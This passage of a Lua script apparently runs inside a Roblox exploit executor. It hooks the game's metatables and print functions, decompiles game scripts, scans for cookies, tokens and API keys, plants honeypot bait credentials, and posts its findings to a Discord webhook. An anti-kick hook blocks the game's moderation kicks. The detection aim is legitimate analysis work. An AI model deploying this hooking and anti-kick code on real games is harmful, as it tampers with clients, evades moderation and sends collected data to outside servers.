        if prev.url~=url then raw_push("fingerprint",{op="url_rotated",old=prev.url,new=url,count=prev.count,src=ctx.src or "?"}) end
    end
end

local cred_lineage={}
local function track_lineage(pattern,value,src)
    if not CONFIG.rotation_tracker then return end
    local key=pattern.."|"..simple_hash(value)
    if not cred_lineage[key] then cred_lineage[key]={srcs={},count=0} end
    local L=cred_lineage[key]; L.count=L.count+1
    if src then L.srcs[src]=(L.srcs[src] or 0)+1 end
    local distinct=0; for _ in pairs(L.srcs) do distinct=distinct+1 end
    if distinct>=2 then raw_push("lineage",{op="shared_cred",pattern=pattern,distinct_srcs=distinct,count=L.count}) end
end

local remote_schemas={}
local function learn_remote(target,method,args)
    if not CONFIG.remote_schema then return end
    local key=fmt_ident(target)..":"..method
    local sig={}
    for i=1,math.min(args.n or 0,6) do local t=type(args[i]); if t=="table" and typeof(args[i])=="Instance" then t="Instance" end; sig[#sig+1]=t end
    local sigstr=table.concat(sig,",")
    local s=remote_schemas[key]
    if not s then remote_schemas[key]={base=sigstr,count=1,anomalies=0,base_count=args.n or 0}
    else
        s.count=s.count+1
        if s.count>20 and s.base~=sigstr then
            s.anomalies=s.anomalies+1
            raw_push("schema",{op="remote_anomaly",remote=key,expected=s.base,got=sigstr,count=s.count})
        end
        local new_ac=args.n or 0
        if s.count>10 and math.abs(new_ac-(s.base_count or 0))>1 then
            raw_push("remote_schema_anomaly",{op="arg_count_mismatch",remote=key,expected=s.base_count,got=new_ac,count=s.count})
        end
    end
    if analyze_arg_drift then pcall(analyze_arg_drift,key,args) end
end

local script_consts={}
local function scan_script_constants(scr)
    if not CONFIG.string_const_diff or not debug.getconstants then return end
    pcall(function()
        local consts=debug.getconstants(scr); if not consts then return end
        for _,c in ipairs(consts) do
            if type(c)=="string" then
                for _,p in ipairs(PATTERNS) do
                    if c:match(p.re) then raw_push("const",{op="cred_in_constants",pattern=p.name,value=c:sub(1,120),script=scr.Name or "?",sev=p.sev}); break end
                end
            end
        end
        script_consts[scr]={n=#consts,t=mono()}
    end)
end

local ancestry_hist={}
local function ancestry_hash_fn(inst)
    if not CONFIG.ancestry_hash then return end
    pcall(function()
        local name=inst:GetFullName().."/"..inst.ClassName
        local h=simple_hash(name)
        ancestry_hist[h]=ancestry_hist[h] or {n=0,first=mono()}
        ancestry_hist[h].n=ancestry_hist[h].n+1
        if ancestry_hist[h].n==3 then raw_push("ancestry",{op="repeat_creation",hash=h,name=name}) end
    end)
end

local cred_times={}
local function timing_check()
    if not CONFIG.timing_detect or #cred_times<3 then return end
    local deltas={}; for i=2,#cred_times do deltas[#deltas+1]=cred_times[i]-cred_times[i-1] end
    local sum=0; for _,d in ipairs(deltas) do sum=sum+d end
    local avg=sum/#deltas
    for _,d in ipairs(deltas) do if math.abs(d-avg)>0.5 then return end end
    if avg>0.3 and avg<5 then raw_push("timing",{op="automated_loop",avg_delta=avg,count=#cred_times}) end
end

local last_snapshot_t=0
local function regex_snapshot(trigger)
    if not CONFIG.regex_snapshot then return end
    if mono()-last_snapshot_t<30 then return end
    last_snapshot_t=mono()
    pcall(function()
        local env=getgenv and getgenv() or _G; local n=0
        for _ in pairs(env) do n=n+1 end
        raw_push("snapshot",{op="triggered",trigger=trigger,global_keys=n})
    end)
end

local function should_decoy(p) return CONFIG.decoy_injection and (p=="roblox_cookie" or p=="roblox_cookie_alt") end
local function decoy_value() return "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|DECOY_DEVAURORA_"..SESSION_ID end

local exec_fp=nil
local function capture_executor_fingerprint()
    if not CONFIG.exec_fingerprint then return end
    local env=getgenv and getgenv() or _G
    local name,ver="unknown",""
    if env.identifyexecutor then local ok,n,v=pcall(env.identifyexecutor); if ok then name=tostring(n); ver=tostring(v or "") end end
    local hwid=""
    if env.gethwid then local ok,h=pcall(env.gethwid); if ok then hwid=tostring(h) end end
    exec_fp={name=name,ver=ver,hwid=hwid,hash=simple_hash(name..ver..hwid)}
end

local taint=setmetatable({},{__mode="k"})
local taint_strings={}; local taint_string_count=0
local function autotaint_string(s,tag)
    if not CONFIG.autotaint or type(s)~="string" or #s<8 then return end
    if taint_string_count>=CONFIG.taint_strings_max then
        for k in pairs(taint_strings) do taint_strings[k]=nil; taint_string_count=taint_string_count-1; break end
    end
    taint_strings[s]=tag or true; taint_string_count=taint_string_count+1
end
local function is_tainted_string(s) return taint_strings[s] or false end

local function make_event(kind,cat,data,src,line,fn,frames)
    local eid=SESSION_ID..":seq_"..next_seq()
    return {v=SCHEMA_VERSION,eid=eid,session=SESSION_ID,t=mono(),wall=wall(),kind=kind,cat=cat or "unknown",
        src={script=src or "?",fn=fn or "?",line=line or 0},frames=frames or {},
        prov={class="OBSERVED",depth=causal_depth(),thread=tid(coroutine.running())},
        parent=causal_parent(),root=causal_root(),data=data or {}}
end

local function log_event(kind,data)
    if in_reentry() then return nil end
    local src,line,fn,frames=caller_info(4)
    if data and data.src then src=data.src end
    if data and data.line then line=data.line end
    if data and data.fn then fn=data.fn end
    if not level_allows(kind) then return nil end

    local cat = data and data.cat
    if not cat then
        if kind=="secret" then cat="SECURITY"
        elseif kind=="http" or kind=="network" then cat="NETWORK"
        elseif kind=="file" or kind=="clipboard" or kind=="custom_asset" then cat="FILESYSTEM"
        elseif kind=="read" or kind=="write" or kind=="attribute" or kind=="lighting" or kind=="camera" then cat="PROPERTY"
        elseif kind=="call" or kind=="invoke" or kind=="closure" then cat="METHOD"
        elseif kind=="remote" or kind=="signal" or kind=="chat" or kind=="player" or kind=="sound" or kind=="animation" or kind=="input" or kind=="gui" then cat="EVENT"
        elseif kind=="task" or kind=="coroutine" or kind=="teleport_queue" then cat="TASK"
        elseif kind=="error" then cat="ERROR"
        elseif kind=="diff" or kind=="state_diff" or kind=="env_snapshot" then cat="STATE"
        else cat="ENV" end
    end

    local ev=make_event(kind,cat,data,src,line,fn,frames)
    enqueue(ev)

    if jsonl_handle then pcall(function() jsonl_handle:write(to_json(ev),"\n"); jsonl_handle:flush() end) end

    if kind~="secret" then
        write_envlog_line(kind,data)
        envlog_queue[#envlog_queue+1]={kind=kind,payload=data,t=mono()}
        if #envlog_queue>=CONFIG.envlog_batch_max then flush_envlog_queue(true) end
    end

    if CONFIG.secret_enabled and CONFIG.secret_scan_kinds[kind] and data then
        pcall(function()
            local ctx={kind=kind,src=src,line=line,fn=fn}
            for k,v in pairs(data) do
                if k=="frames" then for _,f in ipairs(v) do scan_string(f.src or "",ctx) end
                elseif type(v)=="string" then scan_string(v,ctx)
                elseif type(v)=="table" then scan_table(v,ctx,0) end
            end
        end)
    end

    local src_node="script:"..(src or "?")..":"..(fn or "?")
    graph_add_node(src_node,"function",fn)
    if data and data.target then
        local target_id=oid(data.target) or "?"
        graph_add_node("obj:"..target_id,"object",tostring(data.target))
        graph_add_edge(src_node,"obj:"..target_id,kind)
    end
    if data and data.op then
        graph_add_node("api:"..tostring(data.op),"api",tostring(data.op))
        graph_add_edge(src_node,"api:"..tostring(data.op),kind)
    end

    if CONFIG.lineage_enabled and data then
        for k,v in pairs(data) do if type(v)=="string" then lineage_touch(v,k,ev.eid) end end
    end

    pcall(schema_observe,ev)
    pcall(coverage_hit,ev)
    pcall(run_signatures,kind,data)
    if CONFIG.trace_script_scores and src and src~="?" then
        local wm={secret=10,remote=2,http=5,file=5,closure=8,debug=3,known_bad=15,sig=4}
        script_scores[src]=(script_scores[src] or 0)+(wm[kind] or 1)
    end
    if CONFIG.trace_exfil_chain then
        local esrc=src or "?"
        if kind=="remote" and data and (data.method=="FireServer" or data.method=="InvokeServer") then
            exfil_chain_window[esrc]={t=ev.t,remote=data.method}
        elseif kind=="http" and data then
            local m=tostring(data.method or ""):upper()
            if m:find("POST") or m=="" then
                local prev=exfil_chain_window[esrc]
                if prev and (ev.t-prev.t)<(CONFIG.exfil_chain_window_s or 0.5) then
                    exfil_chain_window[esrc]=nil
                    enqueue(make_event("exfil_chain","SECURITY",{op="remote_to_http",remote=prev.remote,http_url=data.url,delta_s=ev.t-prev.t,chain_src=esrc},esrc,line,fn,frames))
                end
            end
        end
    end
    return ev
end

raw_push = function(kind,data) log_event(kind,data) end

send_embed_async = function(title,fields,desc,color)
    task.spawn(function() pcall(send_embed,title,fields,desc,color) end)
end

local function track_file_hash(content)
    if not CONFIG.trace_file_hash or type(content)~="string" then return end
    local h=simple_hash(content)
    file_hashes[h]=(file_hashes[h] or 0)+1
    if file_hashes[h]>5 then
        log_event("repeat_write",{op="hash_repeat",hash=h,count=file_hashes[h],preview=content:sub(1,64),src="file_hash",line=0,fn="hash"})
    end
end

local function track_payload_hash(source,caller_src)
    if not CONFIG.trace_payload_diff or type(source)~="string" then return end
    local h=simple_hash(source)
    if not payload_hashes[h] then
        payload_hashes[h]={callers={[caller_src]=true},count=1}
    else
        local p=payload_hashes[h]; p.count=p.count+1
        if not p.callers[caller_src] then
            p.callers[caller_src]=true
            local clist={}; for k in pairs(p.callers) do clist[#clist+1]=k end
            if #clist>=2 then
                log_event("same_payload_diff_caller",{op="same_hash",hash=h,callers=clist,count=p.count,src="payload_diff",line=0,fn="check"})
            end
        end
    end
end

local function save_last_session()
    if not CONFIG.trace_session_diff then return end
    pcall(function()
        if not writefile then return end
        local scripts={}; for k in pairs(coverage.scripts) do scripts[#scripts+1]=k end
        table.sort(scripts)
        writefile("_devaurora_last_session.json",to_json({session=SESSION_ID,scripts=scripts,secret_count=SECRETS.hits,t=wall()}))
    end)
end

local function load_session_diff()
    if not CONFIG.trace_session_diff then return end
    pcall(function()
        if not readfile then return end
        local ok,content=pcall(readfile,"_devaurora_last_session.json")
        if not ok or not content or content=="" then return end
        log_event("session_diff",{op="prev_session",preview=content:sub(1,300),src="session_diff",line=0,fn="load"})
    end)
end

obfuscation_score = function(source)
    if type(source)~="string" or #source<50 then return 0 end
    local score=0
    local unique={}; for i=1,#source do unique[source:byte(i)]=true end
    local uc=0; for _ in pairs(unique) do uc=uc+1 end
    if uc>200 then score=score+5 end
    local b64=0; for _ in source:gmatch("[A-Za-z0-9+/=][A-Za-z0-9+/=][A-Za-z0-9+/=][A-Za-z0-9+/=]") do b64=b64+1 end
    if b64>50 then score=score+3 end
    if source:find("getfenv%s*%(") then score=score+4 end
    local lsc=0; for _ in source:gmatch("loadstring") do lsc=lsc+1 end
    if lsc>1 then score=score+3*lsc end
    if not source:find("\n") and #source>500 then score=score+5 end
    local xpc=0; for _ in source:gmatch("[xp]call") do xpc=xpc+1 end
    if xpc>5 then score=score+2 end
    if source:find("\\%d%d%d") and source:find("char%(") then score=score+6 end
    return score
end

enumerate_connections_fn = function(inst,context)
    if not CONFIG.trace_connections then return end
    local env=getgenv and getgenv() or _G
    if not env.getconnections then cap_set("getconnections","UNAVAILABLE","not exposed"); return end
    for _,ename in ipairs({"OnClientEvent","OnClientInvoke","Changed","AncestryChanged"}) do
        pcall(function()
            local ev=inst[ename]; if not ev then return end
            local conns=env.getconnections(ev)
            if conns and #conns>0 then
                log_event("connections",{op="enumerated",remote=inst:GetFullName(),event=ename,count=#conns,context=context,src="getconnections",line=0,fn="enum"})
            end
        end)
    end
end

analyze_arg_drift = function(key,args)
    if not CONFIG.trace_arg_drift then return end
    local s=remote_schemas[key]; if not s or s.count<5 then return end
    if not s.arg_history then s.arg_history={} end
    local parts={}
    for i=1,math.min(args.n or 0,4) do
        local v=args[i]
        if type(v)=="number" then parts[i]=string.format("%.0f",v)
        elseif type(v)=="string" then parts[i]=v:sub(1,32)
        else parts[i]=typeof(v) end
    end
    local h=simple_hash(table.concat(parts,"|"))
    s.arg_history[h]=(s.arg_history[h] or 0)+1
    local unique=0; for _ in pairs(s.arg_history) do unique=unique+1 end
    if unique>10 and s.count>50 then
        log_event("arg_drift",{op="high_variation",remote=key,unique_patterns=unique,calls=s.count,src="arg_drift",line=0,fn="analyze"})
        s.arg_history={}
    end
end

function install_honeypot()
    if not CONFIG.honeypot_enabled then return end
    local env=getgenv and getgenv() or _G
    local bait={
        ROBLOSECURITY_BAIT="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|HONEYPOT_"..SESSION_ID,
        WEBHOOK_BAIT="https://discord.com/api/webhooks/1234567890123456789/HONEYPOT_"..SESSION_ID.."_TOKEN_XXXXXXXXXXXXXXXXXXXXXXXXXX",
        JWT_BAIT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJIT05FWVBPVCIsInNlc3Npb24iOiIiLCJpYXQiOjB9.HONEYPOT_"..SESSION_ID,
        API_KEY_BAIT="sk-HONEYPOT"..SESSION_ID.."XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
    }
    for k,v in pairs(bait) do
        env[k]=v
        autotaint_string(v,"honeypot_"..k)
        PATTERNS[#PATTERNS+1]={name="honeypot_"..k,re=v:sub(1,40):gsub("([%.%+%-%*%?%[%]%^%$%(%)%%])",function(c) return "%"..c end),sev="CRIT"}
    end
    log_event("honeypot",{op="injected",keys="ROBLOSECURITY_BAIT,WEBHOOK_BAIT,JWT_BAIT,API_KEY_BAIT",src="honeypot",line=0,fn="init"})
end

function install_print_capture()
    if not CONFIG.trace_print then return end
    local env=getgenv and getgenv() or _G
    for _,name in ipairs({"print","warn","error"}) do
        local old=env[name] or _G[name]
        if type(old)=="function" then
            env[name]=newcclosure(function(...)
                if in_reentry() then return old(...) end
                entering(); local s,l,n,fr=caller_info(2); leaving()
                local parts={}; for i=1,select("#",...) do parts[#parts+1]=tostring(select(i,...)) end
                local msg=table.concat(parts," ")
                scan_string(msg,{kind="print_capture",src=s,line=l,fn=n})
                log_event("print_capture",{op=name,message=msg:sub(1,300),src=s,line=l,fn=n,frames=fr})
                return old(...)
            end)
        end
    end
end

function install_mutation_detector()
    if not CONFIG.trace_mutation then return end
    task.spawn(function()
        task.wait(3)
        local env=getgenv and getgenv() or _G
        if not getscripts then cap_set("mutation_detector","UNAVAILABLE","getscripts not exposed"); return end
        if not env.getscriptbytecode and not getscriptbytecode then cap_set("mutation_detector","UNAVAILABLE","getscriptbytecode not exposed"); return end
        local gbc=env.getscriptbytecode or getscriptbytecode
        local prev={}
        pcall(function()
            if not readfile then return end
            local ok,content=pcall(readfile,"_devaurora_scripthashes.json"); if not ok or not content then return end
            for name,hash in content:gmatch('"([^"]+)":"([^"]+)"') do prev[name]=hash end
        end)
        local current={}
        for _,scr in ipairs(getscripts()) do
            pcall(function()
                local ok,bc=pcall(gbc,scr); if not ok or not bc then return end
                local h=simple_hash(bc); current[scr.Name]=h
                if prev[scr.Name] and prev[scr.Name]~=h then
                    log_event("script_mutated",{op="hash_changed",name=scr.Name,prev_hash=prev[scr.Name],new_hash=h,src="mutation_detector",line=0,fn="check"})
                end
            end)
        end
        pcall(function()
            if not writefile then return end
            local parts={}; for k,v in pairs(current) do parts[#parts+1]='"'..k..'":"'..v..'"' end
            writefile("_devaurora_scripthashes.json","{"..table.concat(parts,",").."}")
        end)
    end)
end

function install_teleport_detect()
    if not CONFIG.trace_teleport_detect then return end
    pcall(function()
        local plr=game:GetService("Players").LocalPlayer; if not plr then return end
        local function watch_char(char)
            if not char then return end
            local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
            local last_pos=hrp.Position; local last_t=mono()
            game:GetService("RunService").Heartbeat:Connect(function()
                local now=mono(); if now-last_t<0.05 then return end
                pcall(function()
                    local pos=hrp.Position
                    local delta=(pos-last_pos).Magnitude
                    if delta>CONFIG.teleport_threshold then
                        log_event("teleport_detect",{op="position_jump",delta=string.format("%.1f",delta),from=tostring(last_pos),to=tostring(pos),src="teleport_detect",line=0,fn="heartbeat"})
                    end
                    last_pos=pos; last_t=now
                end)
            end)
        end
        if plr.Character then watch_char(plr.Character) end
        plr.CharacterAdded:Connect(watch_char)
    end)
end



local function build_creds_file(batch)
    local lines={}
    lines[#lines+1]="Credentials Founds"
    lines[#lines+1]="Author: DevAurora"
    lines[#lines+1]="Session: "..SESSION_ID
    lines[#lines+1]="Generated: "..os.date("%Y-%m-%dT%H:%M:%SZ")
    lines[#lines+1]="Total: "..tostring(#batch)
    lines[#lines+1]=""
    for i,s in ipairs(batch) do
        lines[#lines+1]=string.format("[%d] severity=%s pattern=%s",i,s.sev or "?",s.pattern or "?")
        lines[#lines+1]="    value="..(s.value or "?")
        lines[#lines+1]=string.format("    src=%s:%d",s.src or "?",s.line or 0)
        lines[#lines+1]="    fn="..(s.fn or "?")
        lines[#lines+1]="    kind="..(s.kind or "?")
        if s.decompiled then lines[#lines+1]="    decompiled:"; lines[#lines+1]=s.decompiled end
        lines[#lines+1]=""
    end
    return table.concat(lines,"\n")
end

local function build_envlog_file(batch)
    local lines={}
    lines[#lines+1]="Environment Logged"
    lines[#lines+1]="Author: DevAurora"
    lines[#lines+1]="Session: "..SESSION_ID
    lines[#lines+1]="Generated: "..os.date("%Y-%m-%dT%H:%M:%SZ")
    lines[#lines+1]="Total: "..tostring(#batch)
    lines[#lines+1]=""
    for i,s in ipairs(batch) do
        lines[#lines+1]=string.format("[%d] kind=%s",i,s.kind or "?")
        if s.payload then for k,v in pairs(s.payload) do lines[#lines+1]=string.format("    %s=%s",tostring(k),tostring(v)) end end
        lines[#lines+1]=""
    end
    return table.concat(lines,"\n")
end

local function send_creds_file(batch)
    if #batch==0 then return false,"empty" end
    local worst=worst_sev(batch); local summary=count_patterns(batch); local ts=os.date("!%Y-%m-%dT%H:%M:%SZ")
    local desc=string.format("Captured %d credential(s). Details in attached %s.",#batch,CREDS_FILENAME_DISCORD)
    local payload=string.format(
        '{"embeds":[{"title":"Credentials Found","color":%d,"description":"%s","fields":[{"name":"Count","value":"%d","inline":true},{"name":"Highest Severity","value":"%s","inline":true},{"name":"Top Patterns","value":"%s","inline":false},{"name":"Session","value":"%s","inline":true}],"footer":{"text":"%s"},"timestamp":"%s"}]}',
        EMBED_COLOR,json_escape(desc),#batch,json_escape(worst),json_escape(summary),json_escape(SESSION_ID),json_escape(CUSTOM_FOOTER),ts)
    return post_multipart_file(payload,CREDS_FILENAME_DISCORD,build_creds_file(batch))
end

local function send_envlog_file(batch)
    if #batch==0 then return false,"empty" end
    local ts=os.date("!%Y-%m-%dT%H:%M:%SZ")
    local desc=string.format("Captured %d event(s). Details in attached %s.",#batch,ENVLOG_FILENAME_DISCORD)
    local payload=string.format(
        '{"embeds":[{"title":"Environment Log","color":%d,"description":"%s","fields":[{"name":"Count","value":"%d","inline":true},{"name":"Session","value":"%s","inline":true},{"name":"Dropped","value":"%d","inline":true}],"footer":{"text":"%s"},"timestamp":"%s"}]}',
        EMBED_COLOR,json_escape(desc),#batch,json_escape(SESSION_ID),bus.dropped,json_escape(CUSTOM_FOOTER),ts)
    return post_multipart_file(payload,ENVLOG_FILENAME_DISCORD,build_envlog_file(batch))
end

function send_embed(title,fields,description,color)
    local field_json={}
    for _,f in ipairs(fields or {}) do
        field_json[#field_json+1]=string.format('{"name":"%s","value":"%s","inline":%s}',
            json_escape(f.name or "?"),json_escape(tostring(f.value or "?"):sub(1,1024)),f.inline and "true" or "false")
    end
    local desc=description and string.format(',"description":"%s"',json_escape(description:sub(1,4000))) or ""
    local body=string.format('{"embeds":[{"title":"%s","color":%d%s,"fields":[%s],"footer":{"text":"%s"},"timestamp":"%s"}]}',
        json_escape(title or "event"),color or EMBED_COLOR,desc,table.concat(field_json,","),json_escape(CUSTOM_FOOTER),os.date("!%Y-%m-%dT%H:%M:%SZ"))
    return post_json_with_retry(body)
end

local function attach_caller_source(rec)
    if not CONFIG.decompile_on_critical then return end
    if not (decompile and getscripts and rec.src) then return end
    local target=nil
    for _,scr in ipairs(getscripts()) do if scr.Name==rec.src then target=scr; break end end
    if not target then return end
    local ok,src=pcall(decompile,target)
    if ok and src and type(src)=="string" then
        if #src>CONFIG.decompile_max_bytes then src=src:sub(1,CONFIG.decompile_max_bytes).."\n-- [truncated]" end
        rec.decompiled=src
    end
end

function secret_write(pattern,value,ctx,kind)
    if in_reentry() then return end
    if not CONFIG.secret_enabled then return end
    if CONFIG.secret_dedupe then
        local key=pattern.name.."|"..value
        if SECRETS.seen[key] then return end
        SECRETS.seen[key]=true
    end
    SECRETS.hits=SECRETS.hits+1
    cred_times[#cred_times+1]=mono()
    if #cred_times>32 then table.remove(cred_times,1) end
    timing_check()

    local real_value=value
    if should_decoy(pattern.name) then real_value=decoy_value(); raw_push("decoy",{op="injected",pattern=pattern.name}) end

    local rec={pattern=pattern.name,sev=pattern.sev,value=redact_value(value),
        raw_value=value,src=ctx.src or "?",line=ctx.line or 0,fn=ctx.fn or "?",
        kind=kind or ctx.kind or "?",session=SESSION_ID}

    if rec.sev=="CRIT" then pcall(attach_caller_source,rec); regex_snapshot(pattern.name) end
    if rec.sev=="CRIT" and CONFIG.instant_crit_alerts then
        send_embed_async("CRIT Secret Detected",{{name="Pattern",value=rec.pattern or "?",inline=true},{name="Source",value=rec.src or "?",inline=true},{name="Session",value=SESSION_ID,inline=true}},"Immediate alert - bypassing flush queue",CONFIG.alert_color)
    end

    if creds_handle then
        pcall(function()
            creds_handle:write(string.format("[%s] %s :: %s  <- %s:%d\n",pattern.sev,pattern.name,rec.value,rec.src,rec.line))
            creds_handle:flush()
        end)
    end
    track_lineage(pattern.name,value,rec.src)
    creds_queue[#creds_queue+1]=rec
    raw_push("secret",rec)
    score_event("secret",pattern.sev)
    return real_value
end

local function scan_string(s,ctx)
    if type(s)~="string" or #s<8 then return end
    for _,p in ipairs(PATTERNS) do
        local ok,m=pcall(string.match,s,p.re)
        if ok and m then secret_write(p,type(m)=="string" and m or s,ctx,ctx.kind) end
    end
    if #s>=CONFIG.secret_min_b64_len and s:match("^[A-Za-z0-9+/=]+$") then secret_write({name="base64_blob",sev="LOW"},s:sub(1,96).."...",ctx,ctx.kind) end
    if #s>=CONFIG.secret_min_hex_len and s:match("^[0-9a-fA-F]+$") then secret_write({name="hex_blob",sev="LOW"},s:sub(1,96).."...",ctx,ctx.kind) end
    if CONFIG.locale_detect and has_confusable(s) then raw_push("confusable",{op="detected",value=s:sub(1,120),src=ctx.src or "?"}) end
    if CONFIG.trace_token_reconstruct and scan_partial_tokens then pcall(scan_partial_tokens,s,ctx) end
end

local function scan_table(t,ctx,depth)
    if depth>4 or type(t)~="table" then return end
    for k,v in pairs(t) do
        if type(k)=="string" then scan_string(k,ctx) end
        if type(v)=="string" then scan_string(v,ctx) end
        if type(v)=="table" then scan_table(v,ctx,depth+1) end
    end
end

local function scan_value(v,ctx,depth) depth=depth or 0; if type(v)=="string" then scan_string(v,ctx) elseif type(v)=="table" then scan_table(v,ctx,depth) end end

local function scan_decoded(body,ctx)
    if not CONFIG.http_decode_enabled or type(body)~="string" then return end
    local tried={}
    local function try(s) if s and not tried[s] then tried[s]=true; scan_string(s,ctx) end end
    if body:match("^[A-Za-z0-9+/=]+$") and #body>16 then local ok,d=pcall(b64_decode,body); if ok and d and d:match("%g") then try(d) end end
    if body:find("%%[0-9A-Fa-f][0-9A-Fa-f]") then try(url_decode(body)) end
    if body:match("^[0-9a-fA-F]+$") and #body%2==0 then local ok,d=pcall(hex_decode,body); if ok and d and d:match("%g") then try(d) end end
    if CONFIG.gzip_decode and CAP.zlib and getgenv().zlib and getgenv().zlib.decompress then local ok,d=pcall(getgenv().zlib.decompress,body); if ok and d then try(d) end end
    if CONFIG.xor_brute and #body<5000 then for key=1,255 do local ok,d=pcall(xor_single,body,key); if ok and d and (d:match("https?://") or d:match("eyJ")) then try(d); break end end end
    try(rot13(body))
    if CONFIG.luac_detect then local v=detect_luac(body); if v then raw_push("luac",{op="bytecode",luac_version=v,size=#body,src=ctx.src or "?"}) end end
end

local function rotate_envlog_if_needed()
    if not envlog_handle or not envlog_bytes then return end
    if envlog_bytes<CONFIG.envlog_rotate_bytes then return end
    pcall(function() envlog_handle:close() end)
    pcall(os.rename,CONFIG.envlog_path,CONFIG.envlog_path..".1")
    open_envlog()
end

function write_envlog_line(kind,data)
    if not envlog_handle then return end
    local parts={string.format("[%.3f #%d] %s",mono(),next_seq(),kind)}
    for k,v in pairs(data or {}) do
        if type(v)=="string" then parts[#parts+1]=k.."="..v
        elseif type(v)=="number" then parts[#parts+1]=k.."="..tostring(v)
        elseif type(v)=="table" then
            local sub={}
            for kk,vv in pairs(v) do sub[#sub+1]=tostring(kk)..":"..tostring(vv) end
            parts[#parts+1]=k.."={"..table.concat(sub,",").."}"
        end
    end
    local line=table.concat(parts," | ").."\n"
    pcall(function() envlog_handle:write(line); envlog_handle:flush() end)
    envlog_bytes=(envlog_bytes or 0)+#line
    rotate_envlog_if_needed()
end

function flush_creds_queue()
    if #creds_queue==0 then return end
    local now=mono(); if now-last_creds_send<CONFIG.webhook_min_gap then return end
    last_creds_send=now
    local batch=creds_queue; creds_queue={}
    local lines={"Credentials Founds:"}
    for _,s in ipairs(batch) do lines[#lines+1]=string.format("%s | %s | %s:%d",s.pattern or "?",s.value or "?",s.src or "?",s.line or 0) end
    print(table.concat(lines,"\n"))
    if not next_webhook() then print("Webhook not configured — skipped send"); return end
    local ok,err=send_creds_file(batch)
    if ok then print("Webhooks Successfully Sent!") else print("Webhook failed: "..tostring(err)) end
end

function flush_envlog_queue(force)
    if #envlog_queue==0 then return end
    local now=mono(); if not force and now-last_envlog_send<CONFIG.envlog_send_gap then return end
    last_envlog_send=now
    local batch=envlog_queue; envlog_queue={}
    if not next_webhook() then return end
    send_envlog_file(batch)
end

local signatures={
    {rule="loadstring-large",severity="HIGH",match=function(k,d) return k=="load" and d.op=="loadstring" and (d.size or 0)>400 end},
    {rule="http-exfil",severity="HIGH",match=function(k,d) if k~="http" then return false end local n=tostring(d.op or ""):lower(); return n:find("post") or n:find("request") end},
    {rule="remote-flood",severity="MED",match=function(k,d) if k~="remote" then return false end local b=rate_buckets[(d.src or "?").."|"..tostring(d.method)]; return b and b.n and b.n>25 end},
    {rule="getfenv-escape",severity="MED",match=function(k,d) return k=="env" and d.op and d.op:find("getfenv",1,true)~=nil end},
    {rule="metatable-write",severity="MED",match=function(k,d) if k~="write" then return false end local ks=tostring(d.key); return ks=="__index" or ks=="__newindex" or ks=="__namecall" end},
    {rule="rawset-on-game",severity="MED",match=function(k,d) return k=="raw" and d.op=="rawset" and d.target==game end},
    {rule="file-write",severity="MED",match=function(k,d) return k=="file" and d.op=="writefile" end},
    {rule="player-kick",severity="HIGH",match=function(k,d) return k=="player" and d.op=="Kick" end},
    {rule="humanoid-speed",severity="MED",match=function(k,d) if k~="humanoid" then return false end return d.key=="WalkSpeed" or d.key=="JumpPower" or d.key=="JumpHeight" end},
    {rule="secret-detected",severity="CRIT",match=function(k,d) return k=="secret" and d.sev=="CRIT" end},
    {rule="known-bad-script",severity="HIGH",match=function(k,d) return k=="known_bad" end},
    {rule="remote-schema-anomaly",severity="MED",match=function(k,d) return k=="schema" end},
    {rule="shared-cred-lineage",severity="HIGH",match=function(k,d) return k=="lineage" end},
    {rule="automated-exfil",severity="HIGH",match=function(k,d) return k=="timing" end},
    {rule="confusable-unicode",severity="MED",match=function(k,d) return k=="confusable" end},
}
function run_signatures(kind,data)
    if not CONFIG.trace_signatures then return end
    for _,sig in ipairs(signatures) do
        local ok,hit=pcall(sig.match,kind,data)
        if ok and hit then enqueue({v=SCHEMA_VERSION,eid=SESSION_ID..":sig_"..next_seq(),session=SESSION_ID,t=mono(),wall=wall(),kind="sig",cat="SECURITY",src={script=data and data.src or "?",fn="?",line=0},frames={},prov={class="OBSERVED",depth=0,thread=tid(coroutine.running())},data={rule=sig.rule,severity=sig.severity,origin_kind=kind}}) end
    end
end

local hook_registry={}

function install_metahooks()
    local gm=getrawmetatable and getrawmetatable(game); if not gm then return end
    local old_index=gm.__index; local old_newindex=gm.__newindex; local old_namecall=gm.__namecall
    local was_ro=isreadonly and isreadonly(gm) or false
    if setreadonly then pcall(setreadonly,gm,false) end

    if CONFIG.trace_reads and old_index then
        gm.__index=newcclosure(function(self,key)
            if in_reentry() then return old_index(self,key) end
            entering(); local src,line,fn,frames=caller_info(2)
            local ok,val=pcall(old_index,self,key)
            leaving()
            if ok then log_event("read",{target=self,key=key,value=val,src=src,line=line,fn=fn,frames=frames}) end
            if not ok then return old_index(self,key) end
            return val
        end)
        hook_registry["gm.__index"]=gm.__index
    end
    if CONFIG.trace_writes and old_newindex then
        gm.__newindex=newcclosure(function(self,key,value)
            if in_reentry() then return old_newindex(self,key,value) end
            entering(); local src,line,fn,frames=caller_info(2)
            log_event("write",{target=self,key=key,value=value,src=src,line=line,fn=fn,frames=frames})
            leaving()
            return old_newindex(self,key,value)
        end)
        hook_registry["gm.__newindex"]=gm.__newindex
    end
    if old_namecall then
        gm.__namecall=newcclosure(function(self,...)
            if in_reentry() then return old_namecall(self,...) end
            local method=getnamecallmethod and getnamecallmethod() or "?"
            local src,line,fn,frames=caller_info(2)
            local args=table.pack(...)
            if CONFIG.anti_kick and method=="Kick" then log_event("player",{op="Kick-BLOCKED",target=self,args=args,src=src,line=line,fn=fn,frames=frames}); return nil end
            local is_remote=method=="FireServer" or method=="InvokeServer" or method=="Fire" or method=="Invoke"
            local is_signal=method=="Connect" or method=="Once" or method=="Wait" or method=="ConnectParallel"
            local is_player=method=="LoadCharacter" or method=="MoveTo" or method=="TakeDamage"
            local is_chat=method=="SayMessageRequest" or method=="Chat" or method=="SendAsync"
            local is_humanoid=method=="Move" or method=="ChangeState"
            local ev=nil
            if CONFIG.trace_remote and is_remote then
                local class="?"; entering(); pcall(function() class=self.ClassName end); leaving()
                local attrib
